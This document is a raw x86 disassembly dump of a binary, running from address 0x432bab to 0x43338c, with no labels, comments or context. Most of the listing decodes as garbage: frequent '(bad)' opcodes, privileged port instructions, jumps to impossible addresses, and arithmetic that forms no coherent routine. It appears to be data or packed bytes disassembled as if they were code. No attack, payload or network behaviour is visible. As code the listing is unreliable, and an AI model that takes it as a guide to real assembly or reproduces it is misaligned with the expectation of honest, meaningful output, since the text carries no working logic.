  432bab:	pop    ebp
  432bac:	lea    ecx,[edi]
  432bae:	mov    dl,bh
  432bb0:	add    BYTE PTR [edi],cl
  432bb2:	mov    DWORD PTR [eax+eax*8],edi
  432bb5:	mov    ebx,0x3b87
  432bba:	add    BYTE PTR [ebx],ch
  432bbc:	inc    ebp
  432bbd:	data16 (bad) 
  432bbf:	clc    
  432bc0:	int3   
  432bc1:	cmp    eax,DWORD PTR [eax]
  432bc3:	je     0x432b4e
  432bc5:	push   0xffffffc8
  432bc7:	pop    edi
  432bc8:	xchg   DWORD PTR [ebp+0x0],eax
  432bcb:	data16 add BYTE PTR [ebp+0x45],cl
  432bcf:	lea    cx,[ebp+0x10]
  432bd3:	jb     0x432bd5
  432bd5:	jmp    0x432b60
  432bd7:	call   eax
  432bd9:	clc    
  432bda:	xchg   DWORD PTR [edi+0x1],edi
  432bdd:	mov    eax,DWORD PTR [eax]
  432bdf:	or     BYTE PTR [ebp-0x49],al
  432be2:	lea    eax,[eax+0x74003154]
  432be8:	push   edi
  432be9:	inc    edx
  432bea:	jge    0x432beb
  432bec:	mov    DWORD PTR [edi],ecx
  432bee:	fdiv   DWORD PTR [edi-0x6]
  432bf1:	inc    DWORD PTR [eax]
  432bf3:	xor    edx,DWORD PTR [eax+0x5f]
  432bf6:	xchg   DWORD PTR [ebx+0x1],ebx
  432bf9:	ret    0x0
  432bfc:	xor    BYTE PTR [ebp-0x51],cl
  432bff:	cmp    edi,0xf0ff89fe
  432c05:	data16 ror al,0x84
  432c09:	rol    BYTE PTR [eax],0x3b
  432c0c:	add    al,dh
  432c0e:	dec    eax
  432c0f:	xchg   esp,eax
  432c10:	push   ebx
  432c11:	jmp    0x432b9e
  432c13:	push   ebp
  432c14:	add    esp,ebp
  432c16:	add    ebp,esp
  432c18:	mov    edx,DWORD PTR [edi+0x24]
  432c1b:	clc    
  432c1c:	dec    esi
  432c1d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432c23:	cmp    BYTE PTR [ebx],al
  432c25:	jne    0x432bb0
  432c27:	xor    esp,eax
  432c29:	jmp    0x462dac
  432c2e:	add    ebp,DWORD PTR [ecx+ecx*4]
  432c31:	jne    0x432c27
  432c33:	call   0xffcd298d
  432c38:	clc    
  432c39:	xchg   edi,eax
  432c3a:	sti    
  432c3b:	add    DWORD PTR [ebx],eax
  432c3d:	add    BYTE PTR [ebp+0x47],bl
  432c40:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432c46:	pop    ebp
  432c47:	mov    DWORD PTR [esi-0x48],esi
  432c4a:	jmp    0x432c93
  432c4c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432c52:	(bad)  
  432c54:	cmp    al,0x0
  432c56:	cmp    eax,DWORD PTR [ebp+0x18]
  432c59:	lea    ebx,[ebp-0x56]
  432c5c:	jle    0x432c5e
  432c5e:	jae    0x432be9
  432c60:	mov    eax,esp
  432c62:	call   0xb900:0x8b005587
  432c69:	inc    ebp
  432c6a:	push   ebp
  432c6b:	lea    ecx,[ebp-0x27ff4f12]
  432c71:	mov    eax,edi
  432c73:	int3   
  432c74:	push   ebp
  432c75:	xchg   edi,eax
  432c77:	add    esp,ebp
  432c79:	add    BYTE PTR [eax],al
  432c7b:	inc    ebp
  432c7c:	add    BYTE PTR [ebp+0x8b3255],cl
  432c82:	cld    
  432c83:	mov    DWORD PTR [edx],edi
  432c85:	aam    0x75
  432c87:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432c8d:	mov    DWORD PTR [ebx-0x50],edx
  432c90:	test   BYTE PTR [ebp-0x1],0xe8
  432c94:	mov    eax,DWORD PTR [eax]
  432c96:	hlt    
  432c97:	add    al,al
  432c99:	mov    eax,DWORD PTR ds:0x890045a8
  432c9f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432ca5:	inc    DWORD PTR [eax*2+0xf75854d]
  432cac:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432cb2:	call   0x729989f3
  432cb7:	je     0x432d17
  432cb9:	js     0x432d1a
  432cbb:	lock ret 0x7e
  432cbf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432cc5:	mov    edi,edi
  432cc7:	sbb    al,bl
  432cc9:	clc    
  432cca:	add    BYTE PTR [ebp-0x73],bh
  432ccd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432cd3:	ror    BYTE PTR [eax],1
  432cd5:	dec    ebp
  432cd6:	xchg   ebp,eax
  432cd7:	mov    edi,edi
  432cd9:	in     al,0x8b
  432cdb:	jge    0x432c66
  432cdd:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432ce3:	clc    
  432ce4:	pop    esi
  432ce5:	fist   DWORD PTR [ebp+0x5d398b5d]
  432ceb:	clc    
  432cec:	add    al,0x6e
  432cee:	mov    eax,DWORD PTR [ebx]
  432cf0:	mov    BYTE PTR [ebp+0x0],dl
  432cf3:	mov    edx,DWORD PTR [ebx-0x20]
  432cf6:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432cfc:	add    eax,0x3b3b73
  432d01:	adc    al,0x89
  432d03:	pop    eax
  432d04:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432d08:	ret    0xf08
  432d0b:	cmp    al,0x2
  432d0d:	mov    edx,eax
  432d0f:	cld    
  432d10:	add    BYTE PTR [ebp+0x66],dl
  432d13:	add    eax,ebx
  432d15:	add    esp,eax
  432d17:	sub    eax,eax
  432d19:	or     BYTE PTR [ecx-0x77f474bb],cl
  432d1f:	add    BYTE PTR [eax],al
  432d21:	mov    DWORD PTR [ebx-0x24],ebx
  432d24:	push   edi
  432d25:	push   ebp
  432d26:	clc    
  432d27:	add    DWORD PTR [esi+0x1b0100],0x45
  432d2e:	out    0xff,eax
  432d30:	add    edx,DWORD PTR [eax]
  432d32:	jmp    0x432d1c
  432d34:	cmp    ch,0x46
  432d37:	(bad)  
  432d38:	jmp    0x40c8b58a
  432d3d:	je     0x432cc9
  432d3f:	mov    eax,DWORD PTR [eax-0x10c78104]
  432d45:	inc    ebp
  432d46:	add    BYTE PTR [ebx-0x770375],al
  432d4c:	add    ah,ch
  432d4e:	add    edx,esp
  432d50:	pop    edi
  432d51:	pop    ebp
  432d52:	push   ebp
  432d53:	inc    ebx
  432d54:	in     al,dx
  432d55:	pop    ebp
  432d56:	in     al,dx
  432d57:	cmp    edx,DWORD PTR [edi-0x8]
  432d5a:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432d61:	add    al,0x47
  432d63:	push   ebp
  432d64:	mov    esp,ebp
  432d66:	in     al,0x45
  432d68:	dec    ebp
  432d69:	push   esi
  432d6a:	test   DWORD PTR [eax+0xfb010f],esi
  432d70:	add    BYTE PTR [eax+0xc018b],dh
  432d76:	leave  
  432d77:	inc    ebp
  432d78:	test   al,ch
  432d7a:	add    dh,bh
  432d7c:	add    bh,bh
  432d7e:	dec    ebp
  432d7f:	push   cs
  432d80:	mov    DWORD PTR [ecx],eax
  432d82:	hlt    
  432d83:	push   es
  432d84:	dec    ebp
  432d85:	leave  
  432d86:	mov    DWORD PTR [eax],ecx
  432d88:	clc    
  432d89:	cmovge eax,ecx
  432d8c:	mov    ecx,0x85c2f0
  432d92:	clc    
  432d93:	pop    DWORD PTR [ebp+0x1]
  432d96:	push   ebx
  432d97:	add    BYTE PTR [ebp-0x15],bh
  432d9a:	push   esi
  432d9b:	xor    eax,0x898a45
  432da0:	cld    
  432da1:	add    al,BYTE PTR [ebp+0x0]
  432da4:	xor    esp,DWORD PTR [esi-0x64]
  432da7:	add    DWORD PTR [esi+0x78308c1],edi
  432dad:	add    ah,BYTE PTR [ebp-0x49]
  432db0:	int    0xbb
  432db2:	mov    ecx,DWORD PTR [esi+0xc]
  432db5:	add    dh,al
  432db7:	cmp    ecx,ebx
  432db9:	jne    0x432d83
  432dbb:	xor    ecx,DWORD PTR [ebp+0x66]
  432dbe:	jmp    0xca2dc4
  432dc3:	add    DWORD PTR [ebp+0x0],eax
  432dc6:	mov    eax,ebx
  432dc8:	or     al,0x8b
  432dca:	(bad)  
  432dcb:	mov    ecx,esi
  432dcd:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432dd4:	mov    eax,edi
  432dd6:	or     BYTE PTR [edx],cl
  432dd8:	shl    cl,cl
  432dda:	icebp  
  432ddb:	add    BYTE PTR [ebp+0x38],0x8b
  432ddf:	or     BYTE PTR [edx+eax*2],cl
  432de2:	(bad)  
  432de3:	or     cl,dh
  432de5:	stc    
  432de6:	shl    DWORD PTR [ebp-0x30],0xc6
  432dea:	xor    al,0x0
  432dec:	inc    ebp
  432ded:	xchg   BYTE PTR [ebx],al
  432def:	add    esp,edi
  432df1:	add    BYTE PTR [ebp-0x39],cl
  432df4:	mov    al,bl
  432df6:	test   DWORD PTR [ebx+0x1c348375],ecx
  432dfc:	sub    al,0xbf
  432dfe:	jmp    0x432d85
  432e00:	mov    edi,eax
  432e02:	lock jge 0x432df6
  432e05:	lea    esi,[edx-0x74bad5ff]
  432e0b:	mov    ebp,esp
  432e0d:	or     cl,dh
  432e0f:	leave  
  432e10:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432e17:	dec    ebp
  432e18:	dec    ebp
  432e19:	test   DWORD PTR [ebx],eax
  432e1b:	paddb  mm6,mm0
  432e1e:	add    DWORD PTR [eax],eax
  432e20:	dec    ebp
  432e21:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432e27:	mov    esi,DWORD PTR [edx]
  432e29:	or     al,0x2b
  432e2b:	dec    ebp
  432e2c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432e32:	mov    esp,edi
  432e34:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432e3b:	mov    DWORD PTR [ebx],ebp
  432e3d:	call   0xc76b76d
  432e42:	mov    DWORD PTR [ebp+0x10],ecx
  432e45:	(bad)  
  432e46:	push   0x8b85ff10
  432e4b:	clc    
  432e4c:	or     al,0x54
  432e4e:	(bad)  
  432e4f:	push   ecx
  432e50:	retf   
  432e51:	mov    ebx,0xff4d8dc8
  432e56:	mov    DWORD PTR [ebp+0x8],eax
  432e59:	xor    eax,DWORD PTR [ebp-0x75]
  432e5c:	cmp    ebp,DWORD PTR [ebx]
  432e5e:	lsl    ebx,WORD PTR [edi-0x8]
  432e62:	call   DWORD PTR [ebx-0x741bff75]
  432e68:	(bad)  
  432e69:	or     al,0x5b
  432e6b:	dec    ebp
  432e6c:	or     BYTE PTR [ebx],dh
  432e6e:	inc    ebp
  432e6f:	xor    esi,DWORD PTR ds:0x708088d
  432e75:	in     eax,0x9b
  432e77:	add    BYTE PTR [edx],dh
  432e79:	inc    ebp
  432e7a:	pop    edi
  432e7b:	xor    eax,edx
  432e7d:	test   DWORD PTR [eax],0x81108b8b
  432e83:	dec    ebp
  432e84:	sub    al,0x33
  432e86:	add    BYTE PTR [ebx],dh
  432e88:	push   esi
  432e89:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432e8f:	mov    edi,eax
  432e91:	or     BYTE PTR [ebp+0x45],al
  432e94:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432e9a:	xor    ecx,ecx
  432e9c:	pushf  
  432e9d:	push   es
  432e9e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432ea5:	dec    ebp
  432ea6:	inc    ebp
  432ea7:	cmp    BYTE PTR [ecx],0x54
  432eaa:	pushf  
  432eab:	gs (bad) 
  432ead:	shl    esp,1
  432eaf:	dec    ebp
  432eb0:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432eb6:	shr    ecx,1
  432eb8:	xlat   BYTE PTR ds:[ebx]
  432eb9:	rol    bh,cl
  432ebb:	mov    edx,esp
  432ebd:	or     BYTE PTR [ebp+0x4588f84d],al
  432ec3:	mov    ecx,DWORD PTR [eax]
  432ec5:	or     BYTE PTR [eax],al
  432ec7:	push   ebp
  432ec8:	mov    edi,DWORD PTR [eax+0xfc728b]
  432ece:	dec    ebp
  432ecf:	enter  0xceba,0x8
  432ed3:	retf   0x1807
  432ed6:	ret    0x9b4d
  432ed9:	mov    esi,DWORD PTR [edx]
  432edb:	or     al,0x33
  432edd:	into   
  432ede:	add    edx,esi
  432ee0:	add    ecx,edx
  432ee2:	bswap  eax
  432ee4:	ror    esi,0x98
  432ee7:	dec    ebp
  432ee8:	add    cl,ch
  432eea:	mov    edi,edi
  432eec:	hlt    
  432eed:	inc    esi
  432eef:	inc    ebp
  432ef0:	ret    0x4533
  432ef3:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432ef9:	or     BYTE PTR [ebx],dh
  432efb:	dec    ebp
  432efc:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432f02:	jne    0xff8d2ec9
  432f08:	inc    ebp
  432f09:	inc    ebp
  432f0a:	mov    esi,DWORD PTR [ebx]
  432f0c:	clc    
  432f0d:	pop    esi
  432f0e:	ret    0xcaeb
  432f11:	mov    eax,esi
  432f13:	call   0x520483e6
  432f18:	dec    ebp
  432f19:	add    eax,0xf8728b
  432f1e:	adc    eax,0xce0ccac9
  432f23:	push   ebp
  432f24:	ret    0xc6ec
  432f27:	in     al,dx
  432f28:	call   0x33437c31
  432f2d:	push   edi
  432f2e:	add    edi,eax
  432f30:	xor    eax,eax
  432f32:	jmp    0x432f79
  432f34:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432f3a:	add    eax,edi
  432f3c:	shr    eax,cl
  432f3e:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432f44:	mov    esi,DWORD PTR [edx]
  432f46:	in     al,dx
  432f47:	pushf  
  432f48:	ret    0x84c7
  432f4b:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432f51:	inc    ebp
  432f52:	in     al,dx
  432f53:	xor    DWORD PTR [ebp-0x64],eax
  432f56:	mov    eax,edi
  432f58:	cld    
  432f59:	fmul   st(2),st
  432f5b:	sbb    dl,al
  432f5d:	jmp    0x9c3b:0x304d45c1
  432f64:	jbe    0x432f2d
  432f66:	mov    esp,eax
  432f68:	clc    
  432f69:	add    BYTE PTR [ebp+0x0],cl
  432f6c:	mov    ecx,ecx
  432f6e:	lea    eax,[ebp-0x5]
  432f71:	mov    edi,edi
  432f73:	call   0x51ce83bd
  432f78:	hlt    
  432f79:	xor    eax,edx
  432f7b:	mov    esi,0x9b7284
  432f80:	xor    cl,dl
  432f82:	mov    esi,eax
  432f84:	hlt    
  432f85:	into   
  432f86:	inc    ebp
  432f87:	scas   eax,DWORD PTR es:[edi]
  432f88:	mov    ebp,ecx
  432f8a:	cld    
  432f8b:	add    dl,cl
  432f8d:	add    dl,al
  432f8f:	inc    ebp
  432f90:	shr    DWORD PTR [ebx],0x4d
  432f93:	xor    edi,DWORD PTR [ebx]
  432f95:	mov    DWORD PTR [edi],ecx
  432f97:	clc    
  432f98:	dec    esi
  432f99:	inc    ebp
  432f9a:	dec    DWORD PTR [ebx-0x3d2b1775]
  432fa0:	ret    0xc6ca
  432fa3:	mov    BYTE PTR [ebp-0x32],0x53
  432fa7:	scas   eax,DWORD PTR es:[edi]
  432fa8:	inc    ebp
  432fa9:	jmp    0x432fdb
  432fab:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432fb2:	pop    ebx
  432fb3:	xor    ecx,DWORD PTR [ebp+0x3]
  432fb6:	mov    eax,DWORD PTR [ebx]
  432fb8:	clc    
  432fb9:	test   edx,ecx
  432fbb:	mov    ecx,esi
  432fbd:	cld    
  432fbe:	call   0x8ab77508
  432fc3:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432fc9:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432fcf:	fdiv   QWORD PTR [ebx]
  432fd1:	retf   0xce89
  432fd4:	in     al,0xc1
  432fd6:	inc    ebp
  432fd7:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432fdd:	into   
  432fde:	mov    dh,0xc1
  432fe1:	call   0x8c17756a
  432fe6:	(bad)  
  432fe7:	cld    
  432fe8:	mov    ecx,DWORD PTR [ebp-0x14]
  432feb:	xor    eax,ecx
  432fed:	lea    eax,[ebp+0x8]
  432ff0:	mov    esi,DWORD PTR [edx-0x4]
  432ff3:	add    dl,al
  432ff5:	inc    ebp
  432ff6:	mov    esp,0x32d89b8b
  432ffb:	dec    ebp
  432ffc:	mov    esi,DWORD PTR [ebx]
  432ffe:	cld    
  432fff:	xor    eax,edx
  433001:	sub    esp,DWORD PTR [ebp-0x75]
  433004:	int    0xec
  433006:	sub    ecx,eax
  433008:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  43300e:	mov    esi,esp
  433010:	call   0x34177d99
  433015:	inc    DWORD PTR [ebx]
  433017:	mov    edi,DWORD PTR [ebx]
  433019:	cld    
  43301a:	jne    0x433069
  43301c:	mov    esi,DWORD PTR [ebx]
  43301e:	aam    0x8d
  433020:	dec    ebp
  433021:	or     BYTE PTR [ebx],dh
  433023:	jb     0x433028
  433025:	add    BYTE PTR [edi+0x45],bl
  433028:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  43302f:	xor    ebp,esp
  433031:	xor    eax,edi
  433033:	sub    edi,esp
  433035:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  43303b:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433042:	inc    ebp
  433043:	xor    ecx,DWORD PTR [ecx+0x45891403]
  433049:	clc    
  43304a:	mov    eax,edi
  43304c:	nop
  43304d:	fadd   QWORD PTR [eax]
  43304f:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433055:	jmp    0x432fe0
  433057:	mov    eax,DWORD PTR [ecx]
  433059:	fadd   DWORD PTR [eax]
  43305b:	inc    ebp
  43305c:	or     DWORD PTR [ebx],esi
  43305e:	dec    eax
  43305f:	add    edx,DWORD PTR [ebx-0x2d]
  433062:	dec    ebp
  433063:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  433069:	inc    ebp
  43306a:	push   esp
  43306b:	mov    dl,BYTE PTR [ecx-0xd]
  43306e:	xor    ecx,DWORD PTR [ebp-0x45]
  433071:	(bad)  
  433073:	rol    BYTE PTR [eax],0xc1
  433076:	ret    
  433077:	inc    ebp
  433078:	inc    ebp
  433079:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  43307f:	xor    eax,ebx
  433081:	add    eax,DWORD PTR [ebp+0x23]
  433084:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43308a:	cmp    edi,0xc
  43308d:	dec    ebp
  43308e:	inc    ebp
  43308f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433095:	inc    ebp
  433096:	mov    esi,DWORD PTR [ebx]
  433098:	clc    
  433099:	lea    eax,[ebp+0x45725407]
  43309f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  4330a3:	xor    edi,DWORD PTR [eax]
  4330a5:	mov    ecx,0xff8b8d4d
  4330aa:	push   esp
  4330ab:	enter  0x4df7,0x23
  4330af:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  4330b5:	mov    eax,DWORD PTR [ebx]
  4330b7:	loopne 0x4330a4
  4330b9:	ret    0xc68b
  4330bc:	push   esp
  4330bd:	enter  0x9745,0x8b
  4330c1:	inc    ebp
  4330c2:	cld    
  4330c3:	mov    eax,edi
  4330c5:	clc    
  4330c6:	ret    
  4330c7:	ret    0xc645
  4330ca:	mov    esi,DWORD PTR [ebx]
  4330cc:	cld    
  4330cd:	pop    esi
  4330ce:	mov    ebx,0x83458bc3
  4330d4:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  4330d8:	dec    ebp
  4330d9:	xor    DWORD PTR [ebx],esi
  4330db:	pushf  
  4330dc:	add    edi,DWORD PTR [edx-0x7767a77]
  4330e2:	fcom   DWORD PTR [ebp+0x45]
  4330e5:	mov    esi,DWORD PTR [ebx]
  4330e7:	adc    al,0x9c
  4330e9:	inc    ebp
  4330ea:	(bad)  
  4330eb:	mov    ebx,eax
  4330ed:	adc    al,0x85
  4330ef:	cmp    al,0x1
  4330f2:	inc    ebp
  4330f3:	add    BYTE PTR ds:0xe98b9c4d,bh
  4330f9:	mov    eax,DWORD PTR [ebx]
  4330fb:	nop
  4330fc:	add    BYTE PTR [eax],al
  4330fe:	inc    ebp
  4330ff:	mov    esi,DWORD PTR [ebx]
  433101:	add    eax,DWORD PTR [ebx]
  433103:	cmp    al,0x89
  433105:	mov    esp,esi
  433107:	clc    
  433108:	inc    ebp
  433109:	inc    ebp
  43310a:	add    edx,DWORD PTR [esi+0xc]
  43310d:	mov    edi,0x7ff0845
  433112:	in     al,dx
  433113:	(bad)  
  433114:	jne    0x4330b1
  433116:	mov    esi,DWORD PTR [edx]
  433118:	clc    
  433119:	add    ebp,DWORD PTR [esi]
  43311b:	mov    edi,edi
  43311d:	in     al,dx
  43311e:	mov    DWORD PTR [ebp-0x10],eax
  433121:	xor    eax,DWORD PTR [ebp+0x3]
  433124:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  43312a:	fmul   DWORD PTR [ebx-0x173caf39]
  433130:	lea    ecx,[ecx+0x45e8d4bc]
  433136:	clc    
  433137:	mov    edi,edi
  433139:	cmp    BYTE PTR [ebp+0x4d],al
  43313c:	test   DWORD PTR [eax+0x74],ecx
  43313f:	inc    ecx
  433140:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  433146:	ret    
  433147:	inc    eax
  433148:	dec    DWORD PTR [ebx+0x4945f8f0]
  43314e:	push   eax
  43314f:	dec    eax
  433150:	test   al,0xd0
  433152:	dec    eax
  433154:	mov    eax,DWORD PTR [ebp-0x14]
  433157:	mov    eax,DWORD PTR [ebp+0x38]
  43315a:	mov    eax,ecx
  43315c:	fadd   DWORD PTR [ebx]
  43315e:	dec    ebp
  43315f:	inc    eax
  433160:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  433166:	inc    ebp
  433167:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  43316d:	fadd   QWORD PTR [ebx]
  43316f:	inc    ebp
  433170:	or     al,0x33
  433172:	dec    ebp
  433173:	add    edi,DWORD PTR [ebx]
  433175:	mov    DWORD PTR [edx-0x28],esi
  433178:	mov    eax,DWORD PTR [ebp-0x10]
  43317b:	mov    eax,DWORD PTR [eax+0x10]
  43317e:	mov    eax,edi
  433180:	lock ret 
  433182:	inc    ecx
  433183:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433189:	fsubr  st,st(5)
  43318b:	test   DWORD PTR [eax],eax
  43318d:	clc    
  43318e:	push   0x45
  433190:	(bad)  
  433191:	cmp    al,0xec
  433193:	pushf  
  433194:	inc    ebp
  433195:	(bad)  
  433196:	push   eax
  433197:	fsub   DWORD PTR [eax-0x7b]
  43319a:	(bad)  
  43319b:	clc    
  43319c:	mov    eax,0xf8008584
  4331a1:	mov    eax,DWORD PTR [ebp-0x4]
  4331a4:	mov    edi,0x4585c3cc
  4331aa:	clc    
  4331ab:	mov    eax,DWORD PTR [ebp+0x14]
  4331ae:	xor    eax,DWORD PTR [ebp-0x64]
  4331b1:	mov    edi,eax
  4331b3:	in     al,dx
  4331b4:	les    esi,FWORD PTR [ebp-0x7b]
  4331b7:	mov    edi,eax
  4331b9:	or     al,0x4d
  4331bb:	dec    ebp
  4331bc:	mov    eax,ebp
  4331be:	in     al,0xf2
  4331c0:	dec    ebp
  4331c1:	dec    DWORD PTR [ecx+0x4dc7e045]
  4331c7:	fmul   DWORD PTR [ecx+0x4df8f085]
  4331cd:	inc    ebp
  4331ce:	mov    DWORD PTR [ebx],esi
  4331d0:	fadd   QWORD PTR [ebx]
  4331d2:	dec    ebp
  4331d3:	push   eax
  4331d4:	xor    eax,DWORD PTR [ebp+0x3]
  4331d7:	push   eax
  4331d8:	mov    DWORD PTR [eax+ebx*8],ebx
  4331db:	push   esi
  4331dd:	mov    eax,DWORD PTR [eax]
  4331df:	lock cmp eax,0xf84e85c0
  4331e5:	inc    ebp
  4331e6:	test   BYTE PTR [ebx],dh
  4331e8:	add    DWORD PTR [ebx],eax
  4331ea:	add    BYTE PTR [eax+0x4d],dl
  4331ed:	jne    0x433222
  4331ef:	lea    ecx,[ebx-0x7617fc44]
  4331f5:	div    ah
  4331f7:	inc    DWORD PTR [ebp+0x45]
  4331fa:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433200:	jb     0x43318d
  433202:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433209:	mov    ecx,DWORD PTR [ebp-0x10]
  43320c:	xor    ecx,DWORD PTR [ebp+0x3]
  43320f:	mov    edi,DWORD PTR [ebx]
  433211:	adc    BYTE PTR [ebp+0x41],dh
  433214:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43321a:	ret    
  43321b:	push   ss
  43321c:	push   0x45
  43321e:	lea    ecx,[ebx+0x4de80cb0]
  433224:	sti    
  433225:	add    edi,edi
  433227:	or     BYTE PTR [ebp+0x4d],al
  43322a:	mov    ebp,DWORD PTR [ebx]
  43322c:	xor    ebp,ecx
  43322e:	mov    al,BYTE PTR [edx]
  433230:	add    eax,0xc7200
  433235:	jne    0x433284
  433237:	lea    esi,[ebx]
  433239:	mov    al,0xf
  43323b:	call   0xf2900
  433240:	shl    DWORD PTR [ecx],0x84
  433243:	pushf  
  433244:	add    DWORD PTR [ecx+0x4545d000],ecx
  43324a:	mov    esi,DWORD PTR [edx]
  43324c:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  433253:	test   DWORD PTR [eax],eax
  433255:	clc    
  433256:	dec    ebp
  433257:	inc    ebp
  433258:	xor    edi,DWORD PTR [edi+ecx*1]
  43325b:	pushf  
  43325c:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  433263:	lea    eax,[ecx]
  433265:	int3   
  433266:	add    BYTE PTR [ebp+0x45],cl
  433269:	lea    ecx,[ebx-0x75b2cc38]
  43326f:	lea    eax,ds:0x4d72c4
  433275:	mov    ecx,DWORD PTR [ebp-0x4]
  433278:	xor    ecx,edi
  43327a:	bswap  ebx
  43327c:	ror    BYTE PTR [ebp-0x35],0xe9
  433280:	rol    DWORD PTR [ecx],0x84
  433283:	add    BYTE PTR [ecx],al
  433285:	xor    eax,DWORD PTR [eax]
  433287:	pushf  
  433288:	inc    ebp
  433289:	jnp    0x8a43668c
  43328f:	mov    eax,DWORD PTR ds:0xcf72e8
  433295:	lock dec ebp
  433297:	retf   
  433298:	xor    ecx,DWORD PTR [ebp+0xf]
  43329b:	mov    eax,eax
  43329d:	fmul   st,st(3)
  43329f:	test   ecx,0x19b8484
  4332a5:	xor    al,BYTE PTR [eax]
  4332a7:	mov    DWORD PTR [ebp-0x28],eax
  4332aa:	mov    eax,DWORD PTR [ebp+0x33]
  4332ad:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  4332b3:	ret    
  4332b4:	add    al,cl
  4332b6:	dec    ebp
  4332b7:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  4332bd:	add    ecx,DWORD PTR ds:0xc7250
  4332c3:	inc    ebp
  4332c4:	rcl    DWORD PTR [eax+0x4d],0x2b
  4332c8:	mov    edi,edi
  4332ca:	xor    ecx,DWORD PTR [ebx+0xde48a]
  4332d0:	jb     0x433299
  4332d2:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4332d9:	mov    esi,DWORD PTR [ebx]
  4332db:	cld    
  4332dc:	mov    cl,bh
  4332de:	or     eax,0x372b6
  4332e3:	cmp    ecx,eax
  4332e5:	jne    0x433362
  4332eb:	mov    eax,DWORD PTR [ebp-0x20]
  4332ee:	mov    eax,DWORD PTR [eax]
  4332f0:	xor    eax,edi
  4332f2:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4332f9:	mov    ecx,DWORD PTR [ebp-0x4]
  4332fc:	mov    ecx,edi
  4332fe:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433304:	jb     0x433315
  433306:	add    BYTE PTR [edi-0x3f],dl
  433309:	add    BYTE PTR [ebp-0x75],cl
  43330c:	mov    esi,eax
  43330e:	xor    eax,DWORD PTR [eax]
  433310:	mov    al,bh
  433312:	or     eax,0x4b7284
  433317:	xor    al,cl
  433319:	mov    ecx,DWORD PTR [ebp-0x4]
  43331c:	mov    ecx,edi
  43331e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433324:	jb     0x433335
  433326:	add    BYTE PTR [edi],dh
  433328:	enter  0x8500,0x8b
  43332c:	add    ah,bl
  43332e:	add    BYTE PTR [eax],al
  433330:	inc    ebp
  433331:	(bad)  
  433332:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  433339:	mov    esi,DWORD PTR [edx-0x4]
  43333c:	add    bh,cl
  43333e:	dec    ebp
  43333f:	mov    dh,0x8b
  433341:	add    esi,DWORD PTR [ebx]
  433343:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  433349:	add    BYTE PTR [eax],al
  43334b:	mov    eax,ecx
  43334d:	loopne 0x43339c
  43334f:	add    BYTE PTR [ebx-0x757bcc39],cl
  433355:	dec    ebx
  433356:	or     eax,0x8b7232
  43335b:	in     al,0xc1
  43335d:	or     DWORD PTR [ebp-0x31],ecx
  433360:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  433367:	xor    dh,BYTE PTR [edx-0x75]
  43336a:	add    al,dh
  43336c:	enter  0x4f09,0xcf
  433370:	inc    ebp
  433371:	mov    WORD PTR [ebx-0x75cdccb5],cs
  433377:	or     al,BYTE PTR ds:0xe4728b
  43337d:	or     DWORD PTR [ebp-0x31],ecx
  433380:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433387:	cmp    dh,BYTE PTR [edx+0xf]
  43338a:	add    bl,dl
  43338c:	rol    DWORD PTR [eax],0x4d
